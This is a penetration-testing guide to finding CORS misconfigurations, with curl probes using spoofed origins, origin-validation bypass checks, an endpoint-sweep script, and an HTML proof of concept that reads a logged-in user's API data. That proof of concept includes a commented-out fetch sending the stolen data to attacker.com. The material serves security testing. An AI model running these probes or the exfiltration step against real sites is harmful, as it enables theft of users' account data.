# CORS (Cross-Origin Resource Sharing) Misconfiguration Testing

## Objective

Identify CORS policies that allow malicious origins to read sensitive API responses — enabling credential theft, account information exfiltration, and session-based attacks from attacker-controlled websites.

---

## 1. CORS Basics

CORS controls cross-origin access to resources. Vulnerabilities arise when:
- The server reflects any `Origin` header without validation
- The server allows `null` origin with credentials
- The server uses a wildcard (`*`) with `Allow-Credentials: true`
- The `Origin` validation uses weak regex (e.g., prefix/suffix matching)

---

## 2. Basic CORS Test

```bash
# Test 1: Arbitrary origin reflected
curl -si https://target/api/v1/me \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=USER_TOKEN" \
  | grep -iE "access-control-allow-origin|access-control-allow-credentials"

# Test 2: Null origin
curl -si https://target/api/v1/me \
  -H "Origin: null" \
  -H "Cookie: session=USER_TOKEN" \
  | grep -iE "access-control"

# Test 3: Subdomain origin
curl -si https://target/api/v1/me \
  -H "Origin: https://evil.target.com" \
  -H "Cookie: session=USER_TOKEN" \
  | grep -iE "access-control"
```

---

## 3. Vulnerability Pattern Analysis

### Pattern 1 — Arbitrary Origin + Credentials (Critical)
```
Request:  Origin: https://evil.com
Response: Access-Control-Allow-Origin: https://evil.com
          Access-Control-Allow-Credentials: true

→ Attacker can read authenticated API responses cross-origin
```

### Pattern 2 — Wildcard + No Credentials (Low-Medium)
```
Response: Access-Control-Allow-Origin: *
          (No Access-Control-Allow-Credentials)

→ Only readable if no auth required; cookies/tokens not sent cross-origin
```

### Pattern 3 — Null Origin + Credentials (High)
```
Request:  Origin: null
Response: Access-Control-Allow-Origin: null
          Access-Control-Allow-Credentials: true

→ Exploitable from sandboxed iframes, data: URIs, file:// pages
```

---

## 4. Origin Validation Bypass Tests

```bash
BASE_ENDPOINT="https://target/api/v1/me"
SESSION="USER_TOKEN"

# Check: does target.com prefix match?
curl -si "$BASE_ENDPOINT" -H "Origin: https://target.com.evil.com" -H "Cookie: session=$SESSION" \
  | grep "access-control-allow-origin"

# Check: does target.com suffix match?
curl -si "$BASE_ENDPOINT" -H "Origin: https://notarget.com" -H "Cookie: session=$SESSION" \
  | grep "access-control-allow-origin"

# Check: does it match on subdomain wildcard?
curl -si "$BASE_ENDPOINT" -H "Origin: https://anything.target.com" -H "Cookie: session=$SESSION" \
  | grep "access-control-allow-origin"

# Check: does it match with HTTP (not HTTPS)?
curl -si "$BASE_ENDPOINT" -H "Origin: http://target.com" -H "Cookie: session=$SESSION" \
  | grep "access-control-allow-origin"

# Check: does it match attacker-registered subdomain (target.com.evil.com)?
curl -si "$BASE_ENDPOINT" -H "Origin: https://target.com.evil.com" -H "Cookie: session=$SESSION" \
  | grep "access-control-allow-origin"
```

---

## 5. CORS PoC — Exploit Script

When arbitrary origin + credentials is confirmed, demonstrate cross-origin data read:

```html
<!-- cors_poc.html — Open in browser while logged in to target -->
<html>
<body>
<h1>CORS PoC — Credential Read</h1>
<pre id="output">Loading...</pre>
<script>
  // This request uses the victim's cookies due to credentials: 'include'
  fetch('https://TARGET/api/v1/me', {
    credentials: 'include'
  })
  .then(r => r.json())
  .then(data => {
    document.getElementById('output').textContent = JSON.stringify(data, null, 2);
    // In real attack: send data to attacker server
    // fetch('https://attacker.com/steal?data=' + encodeURIComponent(JSON.stringify(data)));
  })
  .catch(e => {
    document.getElementById('output').textContent = 'Error: ' + e;
  });
</script>
</body>
</html>
```

---

## 6. Automated CORS Testing

```bash
# Test all API endpoints for CORS misconfiguration
API_ENDPOINTS=(
  "/api/v1/me"
  "/api/v1/users"
  "/api/v1/settings"
  "/api/v1/payment-methods"
  "/api/admin/users"
)

for EP in "${API_ENDPOINTS[@]}"; do
  RESP=$(curl -si "https://target$EP" \
    -H "Origin: https://evil.com" \
    -H "Cookie: session=USER_TOKEN" \
    | grep -i "access-control-allow-origin")
  if [[ -n "$RESP" ]]; then
    echo "CORS Header on $EP: $RESP"
  fi
  sleep 0.2
done
```

---

## 7. CORS Preflight Analysis

```bash
# OPTIONS preflight request
curl -si -X OPTIONS https://target/api/v1/users \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: DELETE" \
  -H "Access-Control-Request-Headers: Authorization,Content-Type" \
  | grep -iE "access-control|allow-methods|allow-headers"

# Check if DELETE/PUT/PATCH are in Access-Control-Allow-Methods
```

---

## 8. Internal API CORS

Some APIs intended for internal use may have permissive CORS:

```bash
# Test internal/admin API
curl -si "https://target/api/internal/config" \
  -H "Origin: https://evil.com" \
  | grep "access-control"

# Test with corporate internal origin
curl -si "https://target/api/internal/config" \
  -H "Origin: https://internal.target.corp" \
  | grep "access-control"
```

---

## Evidence to Capture

- The request with `Origin: https://evil.com` header
- The response showing reflected origin + `Access-Control-Allow-Credentials: true`
- The CORS PoC HTML showing cross-origin data read (blur sensitive data values)
- Screenshot of browser fetch returning authenticated user data

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| Arbitrary origin reflected + credentials | Pass/Fail | Critical |
| Null origin reflected + credentials | Pass/Fail | High |
| Wildcard + no credentials | Pass/Fail | Low |
| Subdomain wildcard bypass | Pass/Fail | High |
| Domain prefix/suffix bypass | Pass/Fail | High |
| Admin API with permissive CORS | Pass/Fail | Critical |
